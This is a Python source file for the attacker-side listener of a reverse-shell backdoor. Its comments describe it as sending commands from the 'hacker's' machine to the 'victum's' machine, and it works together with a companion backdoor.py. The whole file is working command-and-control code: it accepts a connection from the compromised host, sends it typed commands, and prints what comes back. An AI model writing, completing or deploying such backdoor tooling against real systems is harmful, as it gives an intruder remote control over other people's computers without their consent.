#!/usr/bin/python3
import socket
#backdoor.py - class that send commands from hacker's to victum's machine and receive it's results

#used only in conjuction with  backdoor.py
class Listener:
    def __init__(self, ip, port): #start listen particular port on current machine
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Connection established with " + str(address) + "\n\n\n")


    def execute_remotely(self, command):
        self.connection.send(command.encode()) #send command to victim's machine
        return (self.connection.recv(1024)).decode() #receive command's result from victim's machine


    def run(self):
        counter = 0
        while True:
            counter += 1 #count command's number
            command = str(input("Command №%d is:\n\n" %counter)) #command typing
            if command == "q": #perform exiting
                print(".\n.\n.\nFinished")
                self.connection.send(command.encode()) # send command to terminate 
                break
            result = self.execute_remotely(command) 
            print("\n-----------------------------\n\n" + "Result №%d is:\n\n" %counter + result + "\n-----------------------------\n")
        self.connection.close
    

